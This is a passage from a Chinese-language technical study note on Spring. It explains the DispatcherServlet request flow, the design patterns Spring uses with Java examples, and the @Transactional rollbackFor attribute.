<li>中央控制器将<code>DispatcherServlet</code>将结果传递给视图解析器<code>ViewReslover</code>。<code>ViewReslover</code>主要实现类是：</li>
</ol>
<ul>
<li><code>UrlBasedViewResolver</code>类：通过配置文件，把一个视图名交给到一个<code>View</code>来处理。</li>
</ul>
<ol start="5">
<li><p>视图解析器<code>ViewReslover</code>根据逻辑<code>View</code>查找实际的<code>View</code></p>
</li>
<li><p>中央控制器<code>DispatcherServlet</code>把返回的<code>Model</code>传给<code>view</code>（视图渲染）</p>
</li>
<li><p>把<code>View</code>返回给请求者（浏览器）</p>
</li>
</ol>
<h2 id="DispatcherServlet源码"><a href="#DispatcherServlet源码" class="headerlink" title="DispatcherServlet源码"></a>DispatcherServlet源码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.springframework.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;serial&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DispatcherServlet</span> <span class="keyword">extends</span> <span class="title">FrameworkServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String MULTIPART_RESOLVER_BEAN_NAME = <span class="string">&quot;multipartResolver&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String LOCALE_RESOLVER_BEAN_NAME = <span class="string">&quot;localeResolver&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String THEME_RESOLVER_BEAN_NAME = <span class="string">&quot;themeResolver&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String HANDLER_MAPPING_BEAN_NAME = <span class="string">&quot;handlerMapping&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String HANDLER_ADAPTER_BEAN_NAME = <span class="string">&quot;handlerAdapter&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String HANDLER_EXCEPTION_RESOLVER_BEAN_NAME = <span class="string">&quot;handlerExceptionResolver&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String REQUEST_TO_VIEW_NAME_TRANSLATOR_BEAN_NAME = <span class="string">&quot;viewNameTranslator&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String VIEW_RESOLVER_BEAN_NAME = <span class="string">&quot;viewResolver&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String FLASH_MAP_MANAGER_BEAN_NAME = <span class="string">&quot;flashMapManager&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String WEB_APPLICATION_CONTEXT_ATTRIBUTE = DispatcherServlet.class.getName() + <span class="string">&quot;.CONTEXT&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String LOCALE_RESOLVER_ATTRIBUTE = DispatcherServlet.class.getName() + <span class="string">&quot;.LOCALE_RESOLVER&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String THEME_RESOLVER_ATTRIBUTE = DispatcherServlet.class.getName() + <span class="string">&quot;.THEME_RESOLVER&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String THEME_SOURCE_ATTRIBUTE = DispatcherServlet.class.getName() + <span class="string">&quot;.THEME_SOURCE&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String INPUT_FLASH_MAP_ATTRIBUTE = DispatcherServlet.class.getName() + <span class="string">&quot;.INPUT_FLASH_MAP&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String OUTPUT_FLASH_MAP_ATTRIBUTE = DispatcherServlet.class.getName() + <span class="string">&quot;.OUTPUT_FLASH_MAP&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String FLASH_MAP_MANAGER_ATTRIBUTE = DispatcherServlet.class.getName() + <span class="string">&quot;.FLASH_MAP_MANAGER&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String EXCEPTION_ATTRIBUTE = DispatcherServlet.class.getName() + <span class="string">&quot;.EXCEPTION&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String PAGE_NOT_FOUND_LOG_CATEGORY = <span class="string">&quot;org.springframework.web.servlet.PageNotFound&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_STRATEGIES_PATH = <span class="string">&quot;DispatcherServlet.properties&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> Log pageNotFoundLogger = LogFactory.getLog(PAGE_NOT_FOUND_LOG_CATEGORY);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Properties defaultStrategies;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassPathResource resource = <span class="keyword">new</span> ClassPathResource(DEFAULT_STRATEGIES_PATH, DispatcherServlet.class);</span><br><span class="line">            defaultStrategies = PropertiesLoaderUtils.loadProperties(resource);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Could not load &#x27;DispatcherServlet.properties&#x27;: &quot;</span> + ex.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Detect all HandlerMappings or just expect &quot;handlerMapping&quot; bean? */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> detectAllHandlerMappings = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Detect all HandlerAdapters or just expect &quot;handlerAdapter&quot; bean? */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> detectAllHandlerAdapters = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Detect all HandlerExceptionResolvers or just expect &quot;handlerExceptionResolver&quot; bean? */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> detectAllHandlerExceptionResolvers = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Detect all ViewResolvers or just expect &quot;viewResolver&quot; bean? */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> detectAllViewResolvers = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Throw a NoHandlerFoundException if no Handler was found to process this request? **/</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> throwExceptionIfNoHandlerFound = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Perform cleanup of request attributes after include request? */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> cleanupAfterInclude = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** MultipartResolver used by this servlet */</span></span><br><span class="line">    <span class="keyword">private</span> MultipartResolver multipartResolver;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** LocaleResolver used by this servlet */</span></span><br><span class="line">    <span class="keyword">private</span> LocaleResolver localeResolver;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** ThemeResolver used by this servlet */</span></span><br><span class="line">    <span class="keyword">private</span> ThemeResolver themeResolver;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** List of HandlerMappings used by this servlet */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;HandlerMapping&gt; handlerMappings;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** List of HandlerAdapters used by this servlet */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;HandlerAdapter&gt; handlerAdapters;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** List of HandlerExceptionResolvers used by this servlet */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;HandlerExceptionResolver&gt; handlerExceptionResolvers;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** RequestToViewNameTranslator used by this servlet */</span></span><br><span class="line">    <span class="keyword">private</span> RequestToViewNameTranslator viewNameTranslator;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> FlashMapManager flashMapManager;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** List of ViewResolvers used by this servlet */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;ViewResolver&gt; viewResolvers;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DispatcherServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DispatcherServlet</span><span class="params">(WebApplicationContext webApplicationContext)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(webApplicationContext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onRefresh</span><span class="params">(ApplicationContext context)</span> </span>&#123;</span><br><span class="line">        initStrategies(context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initStrategies</span><span class="params">(ApplicationContext context)</span> </span>&#123;</span><br><span class="line">        initMultipartResolver(context);</span><br><span class="line">        initLocaleResolver(context);</span><br><span class="line">        initThemeResolver(context);</span><br><span class="line">        initHandlerMappings(context);</span><br><span class="line">        initHandlerAdapters(context);</span><br><span class="line">        initHandlerExceptionResolvers(context);</span><br><span class="line">        initRequestToViewNameTranslator(context);</span><br><span class="line">        initViewResolvers(context);</span><br><span class="line">        initFlashMapManager(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>DispatcherServlet</code>类中的属性<code>beans</code>有：</p>
<ul>
<li><code>HandlerMapping</code>：用于<code>handlers</code>映射请求和一系列对于拦截器的前处理和后处理，大部分用<code>@Controller</code>注解</li>
<li><code>HandlerAdapter</code>：帮助<code>DispatcherServlet</code>处理映射请求处理程序的适配器，而不用考虑实际调用的是哪个处理程序</li>
<li><code>ViewResolver</code>：根据实际配置解析实际的View类型</li>
<li><code>ThemeResolver</code>：解决Web应用程序可以使用的主题，例如提供个性化布局</li>
<li><code>MultipartResolver</code>：解析多部分请求，以支持从HTML表单上传文件</li>
<li><code>FlashMapManager</code>：存储并检索可用于将一个请求属性传递到另一个请求的<code>input</code>和<code>output</code>的<code>FlashMap</code>,通常用于重定向</li>
</ul>
<h1 id="13-Spring框架中用到了哪些设计模式"><a href="#13-Spring框架中用到了哪些设计模式" class="headerlink" title="13. Spring框架中用到了哪些设计模式"></a>13. Spring框架中用到了哪些设计模式</h1><h2 id="工厂设计模式"><a href="#工厂设计模式" class="headerlink" title="工厂设计模式"></a>工厂设计模式</h2><p>Spring使用工厂模式可以通过<code>BeanFactory</code>或者<code>ApplicationContext</code>创建bean对象。</p>
<p><strong>两者对比/<code>BeanFactory</code> 和 <code>ApplicationContext</code> 的区别</strong>：</p>
<ul>
<li><code>BeanFactory</code>：延迟注入（使用到某个bean的时候才会注入），相比于<code>ApplicationContext</code>来说会占用更少的内存，程序启动速度更快</li>
<li><code>ApplicationContext</code>：容器启动的时候，不管用没用到，一次性创建所有bean。<code>BeanFactory</code>仅提供了最基本的依赖注入支持，<code>ApplicationContext</code>扩展了<code>BeanFactory</code>，除了有<code>BeanFactory</code>的功能，还有额外的更多功能，所以一般使用<code>ApplicationContext</code>。</li>
</ul>
<p><code>ApplicationContext</code>的三个实现类：</p>
<ol>
<li><code>ClassPathXmlApplicationContext</code>：把上下文文件当成类路径资源</li>
<li><code>FileSystemXmlApplicationContext</code>：从文件系统中的XML文件载入上下文定义信息</li>
<li><code>XmlWebApplicationContextContext</code>：从Web系统中的XML文件载入上下文定义信息</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.FileSystemXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> FileSystemXmlApplicationContext(</span><br><span class="line">            <span class="string">&quot;C:/work/IOC Containers/springframework.applicationcontext/src/main/resources/bean-factory-config.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HelloApplicationContext obj = (HelloApplicationContext) context.getBean(<span class="string">&quot;helloApplicationContext&quot;</span>);</span><br><span class="line">        obj.getMsg();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="单例设计模式"><a href="#单例设计模式" class="headerlink" title="单例设计模式"></a>单例设计模式</h2><p>Spring 中 bean 的默认作用域就是<code>singleton</code>(单例)的。</p>
<p>Spring实现单例的方式：</p>
<ul>
<li>xml：<code>bean id=&quot;userService&quot; class=&quot;com.xm.service.UserService&quot; scope=&quot;singleton&quot; /&gt;</code></li>
<li>注解：<code>@Scope(value=&quot;singleton&quot;)</code></li>
</ul>
<p>Spring通过<code>ConcurrentHashMap</code>实现<strong>单例注册表</strong>的特殊方式实现单例模式。核心代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过 ConcurrentHashMap（线程安全） 实现单例注册表</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; singletonObjects = <span class="keyword">new</span> ConcurrentHashMap&lt;String, Object&gt;(<span class="number">64</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getSingleton</span><span class="params">(String beanName, ObjectFactory&lt;?&gt; singletonFactory)</span> </span>&#123;</span><br><span class="line">        Assert.notNull(beanName, <span class="string">&quot;&#x27;beanName&#x27; must not be null&quot;</span>);</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>.singletonObjects) &#123;</span><br><span class="line">            <span class="comment">// 检查缓存中是否存在实例  </span></span><br><span class="line">            Object singletonObject = <span class="keyword">this</span>.singletonObjects.get(beanName);</span><br><span class="line">            <span class="keyword">if</span> (singletonObject == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//...省略了很多代码</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    singletonObject = singletonFactory.getObject();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//...省略了很多代码</span></span><br><span class="line">                <span class="comment">// 如果实例对象在不存在，我们注册到单例注册表中。</span></span><br><span class="line">                addSingleton(beanName, singletonObject);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> (singletonObject != NULL_OBJECT ? singletonObject : <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将对象添加到单例注册表</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addSingleton</span><span class="params">(String beanName, Object singletonObject)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="keyword">this</span>.singletonObjects) &#123;</span><br><span class="line">                <span class="keyword">this</span>.singletonObjects.put(beanName, (singletonObject != <span class="keyword">null</span> ? singletonObject : NULL_OBJECT));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="代理设计模式"><a href="#代理设计模式" class="headerlink" title="代理设计模式"></a>代理设计模式</h2><p>主要运用在Spring AOP中</p>
<h2 id="模版方法模式"><a href="#模版方法模式" class="headerlink" title="模版方法模式"></a>模版方法模式</h2><p>Spring 中<code>jdbcTemplate</code>、<code>hibernateTemplate</code>等以<code>Template</code>结尾的对数据库操作的类，它们就使用到了模板模式。一般情况下，我们都是使用继承的方式来实现模板模式，但是 Spring 并没有使用这种方式，而是使用<code>Callback</code>模式与模板方法模式配合，既达到了代码复用的效果，同时增加了灵活性。</p>
<h2 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h2><p>Spring 事件驱动模型就是观察者模式很经典的一个应用。Spring 事件驱动模型非常有用，在很多场景都可以解耦我们的代码。比如我们每次添加商品的时候都需要重新更新商品索引，这个时候就可以利用观察者模式来解决这个问题。</p>
<h3 id="Spring事件驱动模型中的三种角色"><a href="#Spring事件驱动模型中的三种角色" class="headerlink" title="Spring事件驱动模型中的三种角色"></a>Spring事件驱动模型中的三种角色</h3><h4 id="事件角色"><a href="#事件角色" class="headerlink" title="事件角色"></a>事件角色</h4><p><code>ApplicationEvent</code>（<code>org.springframework.context</code>包下）充当事件的角色，这是一个抽象类，它继承了<code>java.util.EventObject</code>并实现了<code>java.io.Serializable</code>接口。</p>
<p>Spring 中默认存在以下事件，他们都是对<code>ApplicationContextEvent</code>的实现（继承自<code>ApplicationEvent</code>）</p>
<ul>
<li><code>ContextStartedEvent</code>：<code>ApplicationContext</code>启动后触发的事件</li>
<li><code>ContextStoppedEvent</code>：<code>ApplicationContext</code>停止后触发的事件</li>
<li><code>ContextRefreshedEvent</code>：<code>ApplicationContext</code>初始化或者刷新完成后触发的事件</li>
<li><code>ContextClosedEvent</code>：<code>ApplicationContext</code>关闭后触发的事件</li>
</ul>
<h4 id="事件监听者角色"><a href="#事件监听者角色" class="headerlink" title="事件监听者角色"></a>事件监听者角色</h4><p><code>ApplicationListener</code>充当了事件监听者角色，它是一个接口，里面只定义了一个<code>onApplicationEvent()</code>方法来处理<code>ApplicationEvent</code>。</p>
<p><code>ApplicationListener</code>接口类源码如下，可以看出接口定义看出接口中的事件只要实现了<code>ApplicationEvent</code>就可以了。所以，在 Spring中只要实现<code>ApplicationListener</code>接口实现<code>onApplicationEvent()</code>方法即可完成监听事件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.springframework.context;</span><br><span class="line"><span class="keyword">import</span> java.util.EventListener;</span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ApplicationListener</span>&lt;<span class="title">E</span> <span class="keyword">extends</span> <span class="title">ApplicationEvent</span>&gt; <span class="keyword">extends</span> <span class="title">EventListener</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onApplicationEvent</span><span class="params">(E var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="事件发布者角色"><a href="#事件发布者角色" class="headerlink" title="事件发布者角色"></a>事件发布者角色</h4><p><code>ApplicationEventPublisher</code>充当了事件的发布者，它也是一个接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ApplicationEventPublisher</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">publishEvent</span><span class="params">(ApplicationEvent event)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.publishEvent((Object)event);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">publishEvent</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ApplicationEventPublisher</code>接口的<code>publishEvent()</code>这个方法在<code>AbstractApplicationContext</code>类中被实现，实际上事件真正是通过<code>ApplicationEventMuticaster</code>来广播出去的。</p>
<h3 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h3><ol>
<li>定义一个事件：实现一个继承自<code>ApplicationEvent</code>，并且写相应的构造函数；</li>
<li>定义一个事件监听者：实现<code>ApplicationListener</code>接口，重写<code>onApplicationEvent()</code>方法</li>
<li>使用事件发布者发布消息：可以通过<code>ApplicationEventPublisher</code>的<code>publishEvent()</code>方法发布消息</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个事件,继承自ApplicationEvent并且写相应的构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoEvent</span> <span class="keyword">extends</span> <span class="title">ApplicationEvent</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6529995111447704468L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> source 最初发生事件或者与事件相关联的对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DemoEvent</span><span class="params">(Object source,String message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(source);</span><br><span class="line">        <span class="keyword">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMessage</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个事件监听者,实现ApplicationListener接口，重写 onApplicationEvent() 方法；</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoListener</span> <span class="keyword">implements</span> <span class="title">ApplicationListener</span>&lt;<span class="title">DemoEvent</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onApplicationEvent</span><span class="params">(DemoEvent event)</span> </span>&#123;</span><br><span class="line">        String msg = event.getMessage();</span><br><span class="line">        System.out.println(<span class="string">&quot;接收到消息：&quot;</span>+msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发布事件，可以通过ApplicationEventPublisher  的 publishEvent() 方法发布消息。</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoPublisher</span>  </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    ApplicationContext applicationContext;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">publish</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//发布事件</span></span><br><span class="line">        applicationContext.publishEvent(<span class="keyword">new</span> DemoEvent(<span class="keyword">this</span>,message));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当调用<code>DemoPublisher</code>的<code>publish()</code>方法的时候，比如<code>demoPublisher.publish(&quot;你好&quot;)</code>，控制台就会打印出:“接收到的信息是：你好” 。</p>
<h2 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h2><h3 id="Spring-AOP中的适配器模式"><a href="#Spring-AOP中的适配器模式" class="headerlink" title="Spring AOP中的适配器模式"></a>Spring AOP中的适配器模式</h3><p>Spring AOP的增强和通知（<code>Advice</code>）使用到了适配器模式，与之相关的接口是<code>AdvisorAdapter</code></p>
<p>Advice常用的类型有：<code>BeforeAdvice</code>(目标方法调用前，前置通知)、<code>throwsAdvice</code>(目标方法抛出异常，异常通知)、<code>AfterReturningAdvice</code>(目标方法执行结束后，return之前)等。</p>
<p>每个类型Advice（通知）都有对应的拦截器：<code>MethodBeforeAdviceInterceptor</code>、<code>AfterReturningAdviceAdapter</code>、<code>AfterReturningAdviceInterceptor</code>。</p>
<p>Spring预定义的通知要通过对应的适配器，适配成<code>MethodInterceptor</code>接口(方法拦截器)类型的对象（如：<code>MethodBeforeAdviceAdapter</code>负责适配<code>BeforeAdvice</code>）。</p>
<p>通知(<code>advice</code>)==&gt;适配器(<code>AdvisorAdapter</code>),<code>advisor.getAdvice()</code> ==&gt;拦截器(<code>intercepter</code>)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//前置通知适配器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MethodBeforeAdviceAdapter</span> <span class="keyword">implements</span> <span class="title">AdvisorAdapter</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">supportsAdvice</span><span class="params">(Advice advice)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> (advice <span class="keyword">instanceof</span> MethodBeforeAdvice);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> MethodInterceptor <span class="title">getInterceptor</span><span class="params">(Advisor advisor)</span> </span>&#123;</span><br><span class="line">      MethodBeforeAdvice advice = (MethodBeforeAdvice) advisor.getAdvice();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> MethodBeforeAdviceInterceptor(advice);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Spring-MVC中的适配器模式"><a href="#Spring-MVC中的适配器模式" class="headerlink" title="Spring MVC中的适配器模式"></a>Spring MVC中的适配器模式</h3><p>在Spring MVC中，<code>DispatcherServlet</code>根据请求信息调用<code>HandlerMapping</code>，解析请求对应的<code>Handler</code>，解析到对应的<code>Handler</code>（也就是<code>Controller</code>控制器）后，开始由<code>HandlerAdapter</code>适配器处理。</p>
<p><code>HandlerAdapter</code>作为期望接口，具体的适配器实现类用于对目标类进行适配，<code>Controller</code>作为需要适配的类。</p>
<p><strong>为什么要在Spring MVC中使用适配器模式？</strong></p>
<p>Spring MVC中的<code>Controller</code>种类众多，不同类型的<code>Controller</code>通过不同的方法对请求进行处理。如果不利用适配器模式的话，<code>DispatcherServlet</code>直接获取对应类型的<code>Controller</code>，需要自行判断，像下面代码一样：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(mappedHandler.getHandler() <span class="keyword">instanceof</span> MultiActionController)&#123;  </span><br><span class="line">   ((MultiActionController)mappedHandler.getHandler()).xxx  </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(mappedHandler.getHandler() <span class="keyword">instanceof</span> XXX)&#123;  </span><br><span class="line">    ...  </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(...)&#123;  </span><br><span class="line">   ...  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假如再增加一个 Controller类型就要在上面代码中再加入一行 判断语句，这种形式就使得程序难以维护，也违反了设计模式中的开闭原则 – 对扩展开放，对修改关闭。</p>
<h2 id="装饰者模式"><a href="#装饰者模式" class="headerlink" title="装饰者模式"></a>装饰者模式</h2><p>Spring 中配置<code>DataSource</code>的时候，<code>DataSource</code>可能是不同的数据库和数据源。我们能否根据客户的需求在少修改原有类的代码下动态切换不同的数据源？这个时候就要用到装饰者模式。Spring 中用到的包装器模式在类名上含有<code>Wrapper</code>或者<code>Decorator</code>。这些类基本上都是动态地给一个对象添加一些额外的职责。</p>
<h1 id="14-Transactional-rollbackFor-Exception-class-注解了解吗？"><a href="#14-Transactional-rollbackFor-Exception-class-注解了解吗？" class="headerlink" title="14. @Transactional(rollbackFor = Exception.class)注解了解吗？"></a>14. @Transactional(rollbackFor = Exception.class)注解了解吗？</h1><p><code>Exception</code>分为运行时异常<code>RuntimeException</code>和非运行时异常。事务管理对于企业应用来说是至关重要的，即使出现异常情况，它也可以保证数据的一致性。</p>
<p>当<code>@Transactional</code>注解作用于类上时，该类的所有<code>public</code>方法将都具有该类型的事务属性，同时，我们也可以在方法级别使用该标注来覆盖类级别的定义。如果类或者方法加了这个注解，那么这个类里面的方法抛出异常，就会回滚，数据库里面的数据也会回滚。</p>
<p>在<code>@Transactional</code>注解中如果不配置<code>rollbackFor</code>属性,那么事务只会在遇到<code>RuntimeException</code>的时候才会回滚,加上<code>rollbackFor=Exception.class</code>,可以让事物在遇到非运行时异常时也回滚。</p>
